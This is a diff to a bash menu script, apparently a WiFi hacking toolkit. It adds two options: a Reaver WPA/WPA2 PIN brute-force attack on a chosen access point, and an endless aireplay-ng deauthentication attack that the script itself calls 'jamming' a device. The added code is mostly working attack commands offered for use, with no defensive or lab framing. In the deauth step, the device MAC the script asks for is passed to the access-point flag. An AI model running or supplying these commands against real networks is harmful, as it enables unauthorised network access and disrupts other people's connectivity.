@@ -117,6 +117,8 @@ echo "5-Airgeddon"
 echo "6-Lazy Script"
 echo "7-Check interfaces"
 echo "8-sha1 Brute Force Hash Cracker"
+echo "9-Reaver Wpa-Wpa2 Password Cracker"
+echo "10-Aireplay-ng deauth attack"
 echo -e ""
 read choice
 if [ $choice == "0" ]
@@ -196,6 +198,51 @@ then
     printf "${LIGHT_GREEN}"
     echo "Brute Force finished..."
     main
+elif [ $choice == "9" ]
+then
+    printf "${LIGHT_PURPLE}"
+    echo -e  "Enter the name of your interface: "
+    read interface
+    printf "${RED}"
+    echo "Putting interface $interface into monitor mode..."
+    airmon-ng start $interface
+    echo "Finding BSSID of WiFi press Ctrl+C to stop..."
+    airodump-ng $interface
+    printf "${LIGHT_PURPLE}"
+    echo -e "Enter BSSID: "
+    read bssid
+    printf "${RED}"
+    echo "Starting attack... Note: This may take 4 to 10 hours"
+    reaver -i $interface -b $bssid -vv
+    printf "${LIGHT_RED}"
+    echo -e "Checking...${LIGHT_GREEN}Done!"
+    main
+elif [ $choice == "10" ]
+then
+    printf "${LIGHT_PURPLE}"
+    echo -e "Enter interface name: "
+    read interface
+    printf "${RED}"
+    echo "Searching for networks hit Ctrl+C to stop."
+    airodump-ng $interface
+    printf "${LIGHT_PURPLE}"
+    echo -e "Enter BSSID of network: "
+    read bssid
+    echo -e "Enter channel of network: "
+    read channel
+    printf "${RED}"
+    echo "Monitoring traffic on $bssid press Ctrl+C to stop."
+    airodump-ng $interface --bssid $bssid -c $channel
+    printf "${LIGHT_PURPLE}"
+    echo -e "Enter MAC of device to deauth: "
+    read mac
+    printf "${RED}"
+    echo "Jamming $mac press Ctrl+C to stop."
+    aireplay-ng --deauth 0 -a $mac $interface
+    printf "${LIGHT_RED}"
+    echo -e "Checking...${LIGHT_GREEN}Done!"
+    printf "${NC}"
+    main
 else
     main
 fi
@@ -203,3 +250,4 @@ fi
 tool_install
 script_install
 main
+
